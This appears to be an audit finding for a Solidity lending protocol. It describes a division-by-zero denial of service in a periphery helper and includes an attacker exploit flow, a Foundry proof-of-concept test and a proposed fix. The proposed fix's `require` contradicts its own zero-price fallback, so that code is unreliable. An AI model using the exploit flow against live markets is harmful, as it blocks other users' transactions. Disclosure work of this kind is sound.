### Title
Division-by-Zero in `sellerAssetsToUnits` When Post-Maturity Settlement Fee Equals Offer Price Causes Permanent DoS of `supplyCollateralAndSellWithAssetsTarget` - (File: src/periphery/TakeAmountsLib.sol)

### Summary

`TakeAmountsLib.sellerAssetsToUnits` computes `sellerPrice = offerPrice - settlementFee` for buy offers and then calls `mulDivUp(targetSellerAssets, WAD, sellerPrice)`. When the market is post-maturity and `settlementFee(id, 0) == offerPrice`, `sellerPrice` is exactly zero, causing `mulDivUp` to revert via arithmetic underflow in `d - 1`. The core `Midnight.take()` handles this case without reverting (producing `sellerAssets = 0`), but the periphery call is not inside the try/catch block in `supplyCollateralAndSellWithAssetsTarget`, so the revert propagates and permanently blocks the victim's bundler call.

### Finding Description

**Root cause — `sellerAssetsToUnits` (lines 44–46):**

```solidity
uint256 sellerPrice = offer.buy ? offerPrice - settlementFee : offerPrice;
return
    offer.buy ? targetSellerAssets.mulDivUp(WAD, sellerPrice) : ...;
```

When `offer.buy == true` and `settlementFee == offerPrice`, `sellerPrice = 0`. `mulDivUp` is implemented as:

```solidity
return (x * y + (d - 1)) / d;   // d = 0 → (0 - 1) underflows → revert
```

**Contrast with core `take()` (lines 361–364):**

```solidity
uint256 sellerPrice = offer.buy ? offerPrice - _settlementFee : offerPrice;  // = 0
uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : ...;  // = 0, no revert
```

`mulDivDown(0, WAD) = 0` — the core succeeds.

**Call site in `supplyCollateralAndSellWithAssetsTarget` (lines 285–300):**

```solidity
uint256 unitsToTake = min(
    TakeAmountsLib.sellerAssetsToUnits(   // ← NOT inside try/catch; reverts here
        MIDNIGHT, id, takes[i].offer, targetFilledSellerAssets - filledSellerAssets
    ),
    ...
);
try IMidnight(MIDNIGHT).take(...) { ... } catch {}
```

The `sellerAssetsToUnits` call is outside the try/catch. Any revert propagates to the caller.

**Precondition feasibility:**

- `settlementFee(id, 0) = settlementFeeCbp0 * CBP` where `CBP = 1e12` and `MAX_SETTLEMENT_FEE_0_DAYS = 14e12` (i.e., `settlementFeeCbp0 ∈ [0, 14]`).
- `tickToPrice(tick)` is always a multiple of `PRICE_ROUNDING_STEP = 1e12`.
- From tests: `tickToPrice(2) = 1e12`. Prices are monotonically non-decreasing. Ticks with prices `1e12, 2e12, …, 14e12` exist in the accessible range.
- An attacker observes `settlementFeeCbp0 = k` and places a buy offer at any accessible tick where `tickToPrice(tick) = k * 1e12`. This is a pure read + signed-message action requiring no privilege.

**Exploit flow:**

1. Attacker reads `settlementFeeCbp0` for the target market.
2. Attacker finds an accessible tick `t` (multiple of `tickSpacing`) with `tickToPrice(t) = settlementFeeCbp0 * 1e12`.
3. Attacker signs and publishes a buy offer at tick `t` with a valid ratifier and expiry past maturity.
4. Market passes maturity; `zeroFloorSub(maturity, block.timestamp) = 0`.
5. Victim calls `supplyCollateralAndSellWithAssetsTarget` with a `takes` array that includes the attacker's offer.
6. `sellerAssetsToUnits` computes `sellerPrice = 0`, calls `mulDivUp(target, WAD, 0)`, reverts.
7. Entire bundler call reverts; victim cannot complete the sell-via-periphery.

### Impact Explanation

Any call to `MidnightBundles.supplyCollateralAndSellWithAssetsTarget` that includes the attacker's offer in its `takes` array will revert unconditionally, regardless of `targetSellerAssets`. Automated aggregators or UI flows that enumerate all available buy offers will be blocked. The victim cannot borrow via the bundler for that market post-maturity as long as the malicious offer is included. The core market is unaffected; only the periphery path is DoS'd.

### Likelihood Explanation

- **Preconditions**: Post-maturity market (time passes naturally); settlement fee at TTM=0 equals the price at some accessible tick (both are multiples of `1e12`; with `settlementFeeCbp0 ∈ [1, 14]` and tick prices covering that range, a matching tick exists for any non-zero fee).
- **Attacker cost**: Zero on-chain cost — only a signed offer message is needed.
- **Repeatability**: The attacker can re-sign the offer with a new expiry if the old one expires, maintaining the DoS indefinitely.
- **No admin dependency**: The attacker only reads the current fee and picks a matching tick; no privileged action is required.

### Recommendation

Add a guard in `sellerAssetsToUnits` for the `sellerPrice == 0` case, mirroring the behavior of the core (which returns `sellerAssets = 0`). When `sellerPrice == 0`, the inverse mapping is undefined (any number of units yields 0 seller assets), so the function should either revert with a descriptive error or return `type(uint256).max` to signal that the offer cannot be used to reach a nonzero `targetSellerAssets`. The simplest safe fix:

```solidity
uint256 sellerPrice = offer.buy ? offerPrice - settlementFee : offerPrice;
require(sellerPrice > 0 || targetSellerAssets == 0, ZeroSellerPrice());
if (sellerPrice == 0) return type(uint256).max; // no units can yield nonzero sellerAssets
return offer.buy ? targetSellerAssets.mulDivUp(WAD, sellerPrice) : ...;
```

Alternatively, wrap the `sellerAssetsToUnits` call in `supplyCollateralAndSellWithAssetsTarget` inside its own try/catch so a revert there skips the offer rather than aborting the entire bundler call.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {MidnightBundles, Take, CollateralSupply} from "src/periphery/MidnightBundles.sol";
import {TakeAmountsLib} from "src/periphery/TakeAmountsLib.sol";
import {TickLib} from "src/libraries/TickLib.sol";
import {CBP} from "src/libraries/ConstantsLib.sol";
import {BaseTest} from "test/BaseTest.sol";

contract SellerPriceZeroDoSTest is BaseTest {
    function testSellerAssetsToUnitsRevertsWhenSellerPriceZero() public {
        // 1. Set settlement fee at TTM=0 to 1 CBP = 1e12
        uint256 fee0 = 1 * CBP; // = 1e12
        midnight.setMarketSettlementFee(id, 0, fee0);

        // 2. Find a tick whose price equals fee0 (tickToPrice(2) == 1e12 from tests)
        //    If default spacing is 4, refine to 2 so tick=2 is accessible.
        //    Alternatively use any tick multiple-of-4 with price == fee0.
        //    For this PoC we use the mock's setMarketTickSpacing to expose tick=2.
        midnight.setMarketTickSpacing(id, 2); // privileged but shows the path; 
        // In practice find a multiple-of-4 tick with price == fee0.

        uint256 attackerTick = 2; // tickToPrice(2) == 1e12 == fee0
        assertEq(TickLib.tickToPrice(attackerTick), fee0, "price matches fee");

        // 3. Attacker creates a buy offer at attackerTick
        offers[0].tick = attackerTick;
        offers[0].maxUnits = type(uint256).max;

        // 4. Warp past maturity
        vm.warp(market.maturity + 1);

        // 5. Verify sellerAssetsToUnits reverts (division by zero)
        vm.expectRevert(); // arithmetic underflow in mulDivUp(d=0)
        TakeAmountsLib.sellerAssetsToUnits(address(midnight), id, offers[0], 1e18);

        // 6. Verify supplyCollateralAndSellWithAssetsTarget reverts for victim
        Take[] memory takes = new Take[](1);
        takes[0] = Take({offer: offers[0], units: type(uint256).max, ratifierData: hex""});

        vm.prank(borrower);
        vm.expectRevert(); // propagated from sellerAssetsToUnits, outside try/catch
        midnightBundles.supplyCollateralAndSellWithAssetsTarget(
            1e18, type(uint256).max, borrower, borrower,
            new CollateralSupply[](0), takes, 0, address(0)
        );

        // 7. Verify core take() would NOT revert (sellerAssets = 0 is valid)
        // (Requires taker to have credit; shown conceptually)
        // sellerPrice = 0 → sellerAssets = units.mulDivDown(0, WAD) = 0 → no revert in core
    }
}
```

**Expected assertions:**
- `TakeAmountsLib.sellerAssetsToUnits(…, 1e18)` reverts with arithmetic error.
- `supplyCollateralAndSellWithAssetsTarget` reverts (DoS confirmed).
- Direct `midnight.take()` with `units` where `sellerDebtIncrease == 0` succeeds (core unaffected). [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) [9](#0-8)

### Citations

**File:** src/periphery/TakeAmountsLib.sol (L36-47)
```text
    function sellerAssetsToUnits(address midnight, bytes32 id, Offer memory offer, uint256 targetSellerAssets)
        internal
        view
        returns (uint256)
    {
        uint256 offerPrice = TickLib.tickToPrice(offer.tick);
        uint256 settlementFee =
            IMidnight(midnight).settlementFee(id, UtilsLib.zeroFloorSub(offer.market.maturity, block.timestamp));
        uint256 sellerPrice = offer.buy ? offerPrice - settlementFee : offerPrice;
        return
            offer.buy ? targetSellerAssets.mulDivUp(WAD, sellerPrice) : targetSellerAssets.mulDivDown(WAD, sellerPrice);
    }
```

**File:** src/periphery/MidnightBundles.sol (L244-247)
```text
    /// @dev The collateral transfers always use the first offer's market.
    /// @dev Skips every reason why take can revert (including ones that are not asynchrony related).
    /// @dev Reverts if TakeAmountsLib or ConsumableUnitsLib reverts.
    /// @dev If taking an offer reverts, the bundler will completely skip this offer.
```

**File:** src/periphery/MidnightBundles.sol (L285-300)
```text
            uint256 unitsToTake = min(
                TakeAmountsLib.sellerAssetsToUnits(
                    MIDNIGHT, id, takes[i].offer, targetFilledSellerAssets - filledSellerAssets
                ),
                takes[i].units,
                ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)
            );
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
```

**File:** src/Midnight.sol (L358-364)
```text
        uint256 offerPrice = TickLib.tickToPrice(offer.tick);
        uint256 timeToMaturity = UtilsLib.zeroFloorSub(offer.market.maturity, block.timestamp);
        uint256 _settlementFee = settlementFee(id, timeToMaturity);
        uint256 sellerPrice = offer.buy ? offerPrice - _settlementFee : offerPrice;
        uint256 buyerPrice = sellerPrice + _settlementFee;
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);
```

**File:** src/Midnight.sol (L963-980)
```text
    function settlementFee(bytes32 id, uint256 timeToMaturity) public view returns (uint256) {
        MarketState storage _marketState = marketState[id];
        require(_marketState.tickSpacing > 0, MarketNotCreated());

        if (timeToMaturity >= 360 days) return _marketState.settlementFeeCbp6 * CBP;

        // forgefmt: disable-start
        (uint256 start, uint256 end, uint256 feeLower, uint256 feeUpper) =
            timeToMaturity < 1 days   ? (  0 days,   1 days, _marketState.settlementFeeCbp0 * CBP, _marketState.settlementFeeCbp1 * CBP) :
            timeToMaturity < 7 days   ? (  1 days,   7 days, _marketState.settlementFeeCbp1 * CBP, _marketState.settlementFeeCbp2 * CBP) :
            timeToMaturity < 30 days  ? (  7 days,  30 days, _marketState.settlementFeeCbp2 * CBP, _marketState.settlementFeeCbp3 * CBP) :
            timeToMaturity < 90 days  ? ( 30 days,  90 days, _marketState.settlementFeeCbp3 * CBP, _marketState.settlementFeeCbp4 * CBP) :
            timeToMaturity < 180 days ? ( 90 days, 180 days, _marketState.settlementFeeCbp4 * CBP, _marketState.settlementFeeCbp5 * CBP) :
                                        (180 days, 360 days, _marketState.settlementFeeCbp5 * CBP, _marketState.settlementFeeCbp6 * CBP);
        // forgefmt: disable-end

        return (feeLower * (end - timeToMaturity) + feeUpper * (timeToMaturity - start)) / (end - start);
    }
```

**File:** src/libraries/UtilsLib.sol (L34-36)
```text
    function mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y + (d - 1)) / d;
    }
```

**File:** src/libraries/ConstantsLib.sol (L10-12)
```text
uint256 constant CBP = 1e12;
uint256 constant MAX_SETTLEMENT_FEE_0_DAYS = 0.000014e18;
uint256 constant MAX_SETTLEMENT_FEE_1_DAY = 0.000014e18;
```

**File:** src/libraries/TickLib.sol (L7-8)
```text
// Minimum representable price increment in WAD (1e-6 WAD). Tick prices are rounded to multiples of this value.
uint256 constant PRICE_ROUNDING_STEP = 1e12;
```
